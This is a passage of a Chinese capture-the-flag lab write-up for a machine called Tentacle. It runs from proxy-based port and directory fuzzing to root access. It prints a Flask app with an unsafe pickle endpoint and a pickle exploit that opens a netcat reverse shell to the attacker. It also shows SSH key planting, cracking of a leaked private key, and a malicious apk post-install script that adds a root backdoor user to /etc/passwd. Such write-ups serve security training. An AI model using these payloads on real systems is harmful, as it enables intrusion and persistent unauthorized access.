: 15ms]<br></code></pre></td></tr></table></figure><p>发现5000端口是开放的</p><p>curl一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">└─# curl -i -s -x http://192.168.56.21:3128 http://127.0.0.1:5000/  <br>HTTP/1.1 200 OK<br>Server: Werkzeug/3.1.6 Python/3.12.12<br>Date: Mon, 30 Mar 2026 01:11:58 GMT<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 63<br>Cache-Status: Tentacle;fwd=stale;detail=match<br>Via: 1.1 Tentacle (squid/6.12)<br>Connection: keep-alive<br><br>&lt;h1&gt;Tentacle Internal Management API&lt;/h1&gt;&lt;p&gt;Status: Running&lt;/p&gt;    <br></code></pre></td></tr></table></figure><p> 这说明跑在 5000 端口上的 “Internal API” 是一个基于 <strong>Python Flask</strong> 框架开发的 Web 应用。  </p><h4 id="2-3-2目录扫描"><a href="#2-3-2目录扫描" class="headerlink" title="2.3.2目录扫描"></a>2.3.2目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plain">└─# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://127.0.0.1:5000/FUZZ -fc 404 -x http://192.168.56.21:3128<br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\       <br>       /\ \__/ /\ \__/  __  __  /\ \__/       <br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      <br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      <br>         \ \_\   \ \_\  \ \____/  \ \_\       <br>          \/_/    \/_/   \/___/    \/_/       <br><br>       v2.1.0-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://127.0.0.1:5000/FUZZ<br> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Proxy            : http://192.168.56.21:3128<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500<br> :: Filter           : Response status: 404<br>________________________________________________<br><br>api                     [Status: 403, Size: 76, Words: 8, Lines: 2, Duration: 126ms]<br>:: Progress: [4634/4634] :: Job [1/1] :: 481 req/sec :: Duration: [0:00:10] :: Errors: 0 ::<br></code></pre></td></tr></table></figure><p>发现api路径 但还是403 继续fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plain">└─# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://127.0.0.1:5000/api/FUZZ -fc 404 -x http://192.168.56.21:3128<br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\       <br>       /\ \__/ /\ \__/  __  __  /\ \__/       <br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      <br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      <br>         \ \_\   \ \_\  \ \____/  \ \_\       <br>          \/_/    \/_/   \/___/    \/_/       <br><br>       v2.1.0-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://127.0.0.1:5000/api/FUZZ<br> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Proxy            : http://192.168.56.21:3128<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500<br> :: Filter           : Response status: 404<br>________________________________________________<br><br>deploy                  [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 76ms]<br>status                  [Status: 200, Size: 81, Words: 1, Lines: 2, Duration: 153ms]<br>:: Progress: [4634/4634] :: Job [1/1] :: 296 req/sec :: Duration: [0:00:10] :: Errors: 0 ::<br></code></pre></td></tr></table></figure><ul><li><code>**status**</code>** [Status: 200]**：状态接口，通常会泄露系统版本、运行时间或内部路径。</li><li><code>**deploy**</code>** [Status: 405]**：部署接口，这是极其高危的 RCE（远程代码执行）潜在点！</li></ul><p>访问&#x2F;api&#x2F;status</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">─# curl -i -s -x http://192.168.56.21:3128 http://127.0.0.1:5000/api/status<br>HTTP/1.1 200 OK<br>Server: Werkzeug/3.1.6 Python/3.12.12<br>Date: Mon, 30 Mar 2026 01:16:17 GMT<br>Content-Type: application/json<br>Content-Length: 81<br>Cache-Status: Tentacle;fwd=stale;detail=match<br>Via: 1.1 Tentacle (squid/6.12)<br>Connection: keep-alive<br><br>&#123;&quot;cpu&quot;:&quot;12%&quot;,&quot;main_process&quot;:&quot;~operator/Tentacle/app.py&quot;,&quot;memory&quot;:&quot;450MB/2048MB&quot;&#125;<br></code></pre></td></tr></table></figure><p>发现关键~operator&#x2F;Tentacle&#x2F;app.py</p><p>访问得到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs plain"># curl -i -s -x http://192.168.56.21:3128 http://127.0.0.1/~operator/Tentacle/app.py<br>HTTP/1.1 200 OK<br>Date: Mon, 30 Mar 2026 01:17:36 GMT<br>Server: Apache/2.4.66 (Unix)<br>Last-Modified: Wed, 25 Feb 2026 02:52:07 GMT<br>ETag: &quot;653-64b9d16fe490d&quot;<br>Accept-Ranges: bytes<br>Content-Length: 1619<br>Cache-Status: Tentacle;detail=mismatch<br>Via: 1.1 Tentacle (squid/6.12)<br>Connection: keep-alive<br><br>import pickle<br>import base64<br>import os<br>import logging<br>from flask import Flask, request, jsonify<br><br>app = Flask(__name__)<br><br>logging.basicConfig(<br>    level=logging.INFO,<br>    format=&#x27;%(asctime)s - INTERNAL_ADMIN - %(levelname)s - %(message)s&#x27;<br>)<br><br>INTERNAL_TOKEN = &quot;Secret_Admin_Token_2026&quot;<br><br>@app.route(&#x27;/&#x27;)<br>def index():<br>    return &quot;&lt;h1&gt;Tentacle Internal Management API&lt;/h1&gt;&lt;p&gt;Status: Running&lt;/p&gt;&quot;<br><br>@app.route(&#x27;/api&#x27;)<br>@app.route(&#x27;/api/&#x27;)<br>def api_index():<br>    return jsonify(&#123;&quot;error&quot;: &quot;Forbidden&quot;, &quot;message&quot;: &quot;Direct access to API root is not allowed.&quot;&#125;), 403<br><br>@app.route(&#x27;/api/deploy&#x27;, methods=[&#x27;POST&#x27;])<br>def deploy_task():<br>    auth_header = request.headers.get(&#x27;X-Internal-Auth&#x27;)<br>    <br>    task_data = request.form.get(&#x27;task_data&#x27;)<br>    <br>    if not task_data:<br>        return jsonify(&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Missing task_data&quot;&#125;), 400<br><br>    try:<br>        decoded_data = base64.b64decode(task_data)<br>        obj = pickle.loads(decoded_data)<br>        <br>        logging.info(f&quot;Task received and processed: &#123;type(obj).__name__&#125;&quot;)<br>        return jsonify(&#123;&quot;status&quot;: &quot;success&quot;, &quot;message&quot;: &quot;Deployment initiated&quot;&#125;), 200<br>        <br>    except Exception as e:<br>        logging.error(f&quot;Failed to process task: &#123;str(e)&#125;&quot;)<br>        return jsonify(&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid task format&quot;&#125;), 500<br><br>@app.route(&#x27;/api/status&#x27;)<br>def system_status():<br>    return jsonify(&#123;<br>        &quot;cpu&quot;: &quot;12%&quot;,<br>        &quot;memory&quot;: &quot;450MB/2048MB&quot;,<br>        &quot;main_process&quot;: &quot;~operator/Tentacle/app.py&quot;,<br>    &#125;)<br><br>if __name__ == &quot;__main__&quot;:<br>    print(&quot;Tentacle Backend Service starting on http://127.0.0.1:5000&quot;)<br>    app.run(host=&#x27;127.0.0.1&#x27;, port=5000, debug=False)<br></code></pre></td></tr></table></figure><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774833530332-ed4cf62e-7084-4b47-8a05-cb9da340cf5d.png"></p><p>这个因为没有任何过滤 我们可以使用 Pickle 反序列化漏洞  进行反弹shell</p><h2 id="3-Pickle-反序列化漏洞-getshell"><a href="#3-Pickle-反序列化漏洞-getshell" class="headerlink" title="3.  Pickle 反序列化漏洞 -&gt;getshell"></a>3.  Pickle 反序列化漏洞 -&gt;getshell</h2><p>exp.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">import pickle<br>import base64<br>import os<br><br>class RCE:<br>    def __reduce__(self):<br>        # 这是一个经典的 Bash 反弹 Shell 命令<br>        cmd = &quot;busybox nc 192.168.56.2 4444 -e sh&quot;<br>        return os.system, (cmd,)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    # 生成恶意的 pickle 对象并进行 Base64 编码<br>    malicious_data = pickle.dumps(RCE())<br>    payload = base64.b64encode(malicious_data).decode()<br>    print(&quot;你的 task_data Payload 是:&quot;)<br>    print(payload)<br></code></pre></td></tr></table></figure><p>生成值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">你的 task_data Payload 是:<br>gASVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJidXN5Ym94IG5jIDE5Mi4xNjguNTYuMiA0NDQ0IC1lIHNolIWUUpQu<br></code></pre></td></tr></table></figure><p>kali开启监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">nc -lvnp 4444<br></code></pre></td></tr></table></figure><p> 通过代理发送 Payload  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">curl -i -s -X POST -x http://192.168.56.21:3128 \<br>  -d &quot;task_data=gASVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJidXN5Ym94IG5jIDE5Mi4xNjguNTYuMiA0NDQ0IC1lIHNolIWUUpQu&quot; \<br>  http://127.0.0.1:5000/api/deploy<br></code></pre></td></tr></table></figure><p>反弹成功</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774833777213-6d09d5ab-fc28-41aa-a16d-7795236c6888.png"></p><p>写个ssh稳定shell</p><p>然后再连</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">靶机<br>ssh-keygen -t rsa -f /home/operator/.ssh/id_rsa -N &quot;&quot;<br>cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys <br>cat ~/.ssh/id_rsa（复制到攻击机） <br>攻击机<br>vim operator_key<br>chmod 600 operator_key<br>ssh -i operator_key operator@192.168.56.21  <br></code></pre></td></tr></table></figure><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774834132064-d0901f00-33ab-46fb-8d0f-4c6250b90b69.png"></p><h2 id="4-提权至licksore用户"><a href="#4-提权至licksore用户" class="headerlink" title="4.提权至licksore用户"></a>4.提权至licksore用户</h2><p>翻了半天没找到啥提权的信息，群里发了提示：</p><p>网页的波浪号到底是什么呢</p><p>看到operator下有个public_html</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774834991501-cba71b67-95fc-4998-8d8e-78183d4e16d4.png"></p><p>让ai简单分析一下</p><h3 id="🏠-什么是-public-html？"><a href="#🏠-什么是-public-html？" class="headerlink" title="🏠 什么是 public_html？"></a>🏠 什么是 <code>public_html</code>？</h3><p>简单来说，它是 Linux 系统中专门用来存放<strong>个人用户 Web 网站文件</strong>的经典目录。</p><p>在很多配置了 Apache Web 服务器的系统上（比如这台靶机），如果管理员开启了一个叫 <code>**mod_userdir**</code> 的模块，那么系统里的每一个普通用户，都可以在自己的家目录（<code>/home/用户名/</code>）下创建一个名叫 <code>public_html</code> 的文件夹。</p><p>那这样看来，licksore用户也有吧应该</p><p>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">Tentacle:~/public_html$ ls -al /home/licksore/public_html                                                            <br>total 16                                                                                                             <br>drwxr-xr-x    3 licksore licksore      4096 Feb 25 10:44 .                                                           <br>drwx-----x    4 licksore licksore      4096 Feb 25 10:39 ..                                                          <br>drwxr-xr-x    2 licksore licksore      4096 Feb 25 10:43 .ssh                                                        <br>-rw-r--r--    1 licksore licksore        28 Feb 24 22:56 index.html<br></code></pre></td></tr></table></figure><p>发现有个.ssh</p><p>可以读取私钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat  /home/licksore/public_html/.ssh/id_rsa<br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAEecoyn8<br>FswnK5npBrVZ4uAAAAGAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDZ5M9v8S/q<br>MEaaH06lnrA46UpRGcmrI3Um9kpaBj500MXz0wpApyAvw26MBqnymGfOGfg1B+njaDmheY<br>26NYmeMzzcRAYcE3EtI43zLu6l+84+Tvd7sr29ZnmB4sRQzbckYhMAEy42VLlNN1TN1R5a<br>nL76JTDtCVY4Vuw8d/tFxr4iSo4X+2gh2daOf1Fb09BuLWbNh61XEd4b1tPUI0eK5ri7Xx<br>T783pexIp0PCbAuj5ZLDa+SZFjrKVufSJmO13A3+7ML3ZWeqqsKzAHy7SScdYC2uiH/CGl<br>ZFWshWyfS8Yo2uA2biWg1d6c5Tjoaw6RezK9yZgETqfQfIH+qhmW2tEdASxriX/l0rVeXC<br>vNFTexZfM223CqjrvUDmha4LEMM7bWxa3MRygB2Ok80xIhk3W8+dXD+HMS2+RRJOQYbfMW<br>lXvEgl0SutIZvEzw+NCws2aXh5esaA5q+zlyA8ejHswcMF/A5Ydm/F0EErrxp9eIr3ZXxb<br>M1z2yB9WmXQxsAAAWQP0vm4o0e34sz1QbdRFnAjkV/F2IRjOx3AOz4msTkfJhn9FkRoXx0<br>y4EitOoXBJeshjezxFNrunTyHT9CGtr2OAgimwdz8m6O4AhHv332tdywXcpgK0Z2IS5FSQ<br>oMuRrscUkrRW/HWrLOj1pP9tM3N5coWHiNGqjJbeG1oAddPcIGO0ZwwwKzQtqwvjaxlt0U<br>CXpm6f324Hk1VwxZ4p4mrTxY7M81LSS02ji40qggWsX2KbZwYbiD1KZ0aB9oi56ZhZuEMI<br>Vpoigg3frosaSPpyBrZpb3XmzBy24OGCeccYG9bI/8ve7MqJJiPGPCBkkd7LX9fvb9l57A<br>BxMsRQYNLp8IFXW/bGbnEPvop9Wtmy5rRUTin20chNEGUiDj4ggKTSml4ZENTT+TCIY/9h<br>QQnyrgqM5GqHtKlpqYVRINE/3phaIaflkBWWgk9QOeGZLJC+eVXUkOMX9U5BcfraO9tg58<br>X7IJboWoIq8i52PEwUidTZuNvvCPrV9rJOaSVWen4Ehf9VD5n3KE5B8InVpuP27wu8Mjq0<br>JudIHtpImHTDY2FkKBW/99tnNconb3b5reAM1LeFDJR9KuYtiBgstgdsPdm8VdYwTbEYZu<br>wnGWDUe/ooEqNSC/prd/IhZB+lKcTbvZ2447iWo/t46GXb9rLaX8fTaV4wcjl3J5SMP65I<br>MRzex3BywwzEb7Ih4OKd7LTn/Odkn1wJXTQUCFLOWgNplu1YHoLBE1Q3r4k3bdcrnJS5IH<br>kf7Vebly1388RCySgaEOpwSuO0GeDiXqYiW7bs30NIHSJZNJus5gSL4vHZZaVwYLzCNkfB<br>L6DznNkFfApiK0Q55cNBaeEWSri1dm9tW20eIUQdUU2d4n0KToN3x5ZeZovOEFgL1tw02A<br>g7tn3rxEKz1hgP124dlIa7SGGTcYuP3sdcf/+F1ZvRNjzhSwGITEhgOEA8z6gqbUA9zBqr<br>7iAdbtB9ful/0Nm2+1q8EuaAatDjKmhVgQPfh/DDD7i3BkILGuKgMhIDMiJfW4/wX6fLgM<br>eFBTlW7wx+aKkgVfBRX11EFUxXxvqrs8RGsoP6Zsr/Wd4NPk2ShzMEOZg7GSFs2kvzZC4b<br>5Vo2cfl5r5kay3rFGcE5zuWTRmJI/o84WuulSL4cpYyRwlLdxU1TmkUpro7kC5jTvgLNUG<br>ZZjjz3N+juYhT1yZof2aehhdwxskLGYBoqks4DllVFDD2E/FBQgUyjtTgJrKX7f/qW5/z8<br>IfWrnKNfKC2OvyIbzgnU4bxuXn60DWL6OlmLX8fV6425Nje/XfhkG76fdtkUkOO+7EXO7d<br>5KRBBcXDNL4VU7gbgb/21uoYQI1mNm/lILw0bRIOOXmRNjIJDUVjFcRjatLIl6skLxHhzZ<br>2ReU4lVrywsUHWz5zgtmonzVkVAbuHgy3TEpDY3jCi6moaSwQZ0QmfmXjMkODU0iDWc5yl<br>VJkP8vTzkSg62FcTLN/FEoqcO6n8NR0ChA/dAy/0t4u4Mzfb4FhyhOfqvnn8yQD2LHFMdh<br>rvI/eMouJUyxvFa2JL+tDKabS7bwHMp9383R94gYbMLLHXFH9UiMfFlBSXY6iHSjN6S6ak<br>376jDCv39b+CpVb9uZSlkVX5mapGylleLIfTjlxC49YqNPsHi/SsfKTWhYbIGFO2dzyn04<br>+cFUWqoeuUGpFceArTlwzYmtBaXJdV1i8mdY9tershPN680dW8KGLZZmzD5cp7x6w4DD/0<br>m32uFGPVSra7kANPVad9cqrRIa5BtCiDNKYfUXTUSpPBvNK2ev57vRa/YZD4nvGnZV865c<br>0tAYcI7Hmyyx6nTqQR2aUSsP/emUWqjOGdy0CRqfBf6LEvwkaJlV1z+qPNeZnwnXfeODUD<br>7/eMCbAKlvQ6t7oPmxwlCONa3fU=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>保存到本地</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835506353-2e9886ee-1202-4721-9e04-1790bd270b62.png"></p><p>发现得输入私钥 用john破解一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ssh2john licksore_key &gt; licksore_hash.txt<br>john --wordlist=/usr/share/wordlists/rockyou.txt licksore_hash.txt<br></code></pre></td></tr></table></figure><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835755776-24233150-dbbb-4b6f-9786-c96235c9d3b3.png"></p><p>密钥是justice</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835787102-2c242780-cbb5-4896-95b3-7feb5199914d.png"></p><p>成功提权至licksore用户</p><h2 id="5-提权至root用户"><a href="#5-提权至root用户" class="headerlink" title="5.提权至root用户"></a>5.提权至root用户</h2><p>使用sudo -l  发现不用输入密码就可以运行的apk</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835838501-662f859a-e0fe-468a-a052-22d0d97eee6a.png"></p><p>跟网上的照着敲下来的</p><p><a href="https://blog.csdn.net/2301_79518550/article/details/158431683">https://blog.csdn.net/2301_79518550&#x2F;article&#x2F;details&#x2F;158431683</a></p><p>不过要注意的是 这里没有bash环境 有sh的</p><ol><li>准备目录</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">mkdir -p /tmp/evil-pkg/pkg<br>cd /tmp/evil-pkg<br></code></pre></td></tr></table></figure><ol start="2"><li>创建元 数据文件 .PKGINFO</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat &gt; pkg/.PKGINFO &lt;&lt; &#x27;EOF&#x27;<br>pkgname = evil-pwn<br>pkgver = 1.0.0<br>pkgdesc = Test package for privilege escalation demo<br>url = http://example.com<br>builddate = 1735680000<br>packager = root &lt;root@localhost&gt;<br>size = 4096<br>arch = x86_64<br>EOF<br><br></code></pre></td></tr></table></figure><ol start="3"><li>创建 post-install 脚本</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat &gt; pkg/.post-install &lt;&lt; &#x27;EOF&#x27;<br>#!/bin/sh<br>set -e<br><br>echo &#x27;root2:aacFCuAIHhrCM:0:0:root:/root:/bin/sh&#x27; &gt;&gt; /etc/passwd<br>echo &quot; [!] Exploit payload executed successfully!&quot;<br>EOF<br><br>chmod +x pkg/.post-install<br><br></code></pre></td></tr></table></figure><p>这里密码是1</p><ol start="4"><li>打包成 apk</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">cd pkg<br>tar -czf ../evil-pwn.apk .PKGINFO .post-install<br>cd ..<br><br></code></pre></td></tr></table></figure><ol start="5"><li>安装并触发提权</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo apk add --allow-untrusted ./evil-pwn.apk<br><br></code></pre></td></tr></table></figure><p>预期输出示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">WARNING: Support for packages without datahash will be dropped in apk-tools 3.<br>(1/1) Installing evil-pwn (1.0.0)<br>WARNING: Support for packages without datahash will be dropped in apk-tools 3.<br>Executing evil-pwn-1.0.0.post-install<br> [!] Exploit payload executed successfully!<br></code></pre></td></tr></table></figure><ol start="6"><li>验证提权成功</li></ol><p>tail &#x2F;etc&#x2F;passwd</p><h1 id="应该有我们添加的后门用户"><a href="#应该有我们添加的后门用户" class="headerlink" title="应该有我们添加的后门用户"></a>应该有我们添加的后门用户</h1><p>直接su root2 密码为1 就可以进去了</p><h2 id="6-靶场小结"><a href="#6-靶场小结" class="headerlink" title="6.靶场小结"></a>6.靶场小结</h2><p><img src="https://cdn.nlark.com/yuque/0/2026/jpeg/49970571/1774836494088-413bb601-49f6-4fe1-8e25-edfc136c84ae.jpeg" alt="画板"></p>]]></content>
    
    
